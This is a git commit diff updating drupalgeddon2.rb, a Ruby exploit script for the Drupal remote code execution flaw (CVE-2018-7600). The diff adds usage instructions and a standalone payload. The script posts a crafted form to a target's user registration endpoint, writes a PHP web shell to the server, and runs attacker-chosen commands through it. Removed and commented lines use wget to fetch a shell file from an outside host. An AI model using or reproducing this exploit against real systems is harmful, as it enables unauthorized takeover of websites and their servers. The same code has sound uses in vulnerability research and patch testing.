3f8e39de6c9a63a497042ef31d7a4c2fedcb88f1
g0tmi1k <have.you.g0tmi1k@gmail.com>
2018-04-13 09:57:38 +0100

    Improve usability, add standalone payload, add comments

--- drupalgeddon2.rb
+++ drupalgeddon2.rb
@@ -1,16 +1,27 @@
-require 'net/http'
+#!/usr/bin/env ruby
 
-# Hans Topo ruby port from Drupalggedon2 exploit.
-# Based on Vitalii Rudnykh exploit
+# Hans Topo ruby port of Drupalggedon2 exploit ~ https://github.com/dreadlocked/Drupalgeddon2/    (EDBID: 44449 ~ https://www.exploit-db.com/exploits/44449/)
+# Based on Vitalii Rudnykh exploit ~ https://github.com/g0rx/CVE-2018-7600-Drupal-RCE/blob/810789f3a37dc6b1f35267bcccebb1edfa8e3a24/exploit.py
+# Thanks ~ https://research.checkpoint.com/uncovering-drupalgeddon-2/
+
+require 'net/http'
+require 'cgi'
+
+if ARGV.empty?
+  puts "Usage: ruby drupalggedon2.rb <target> <command>"
+  puts "       ruby drupalgeddon2.rb https://example.com whoami"
+  exit
+end
 
 target = ARGV[0]
 command = ARGV[1]
 
 url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
 
-shell = "<?php system($_GET['cmd']); ?>"
+#evil = 'wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon2/master/shell.php'
+evil = 'echo "<?php system($_GET[\"cmd\"]); ?>" > shell.php'
 
-payload = 'mail%5B%23markup%5D%3Dwget%20https%3A%2F%2Fraw.githubusercontent.com%2Fdreadlocked%2FDrupalgeddon2%2Fmaster%2Fsh.php%26mail%5B%23type%5D%3Dmarkup%26form_id%3Duser_register_form%26_drupal_ajax%3D1%26mail%5B%23post_render%5D%5B%5D%3Dexec'
+payload = CGI.escape('mail[#markup]=' + evil + '&mail[#type]=markup&form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec')
 
 uri = URI(url)
 
@@ -23,17 +34,20 @@ end
 
 req = Net::HTTP::Post.new(uri.path)
 req.body = payload
-
+puts "[*] Payload: " + evil
+puts "[*] Sending: " + payload
 response = http.request(req)
 
 if response.code != "200"
 	puts "[*] Response: " + response.code
-	puts "[*] Target seems not to be exploitable"
+	puts "[!] Target does not seem to be exploitable"
 	exit
 end
 
-puts "[*] Target seems to be exploitable."
+puts "[+] Target seems to be exploitable!"
 
-exploit_uri = URI(target+"/sh.php?cmd=#{command}")
+puts "[*] Sending: " + target + "/shell.php?cmd=#{command}"
+exploit_uri = URI(target + "/shell.php?cmd=#{command}")
+
 response = Net::HTTP.get_response(exploit_uri)
 puts response.body
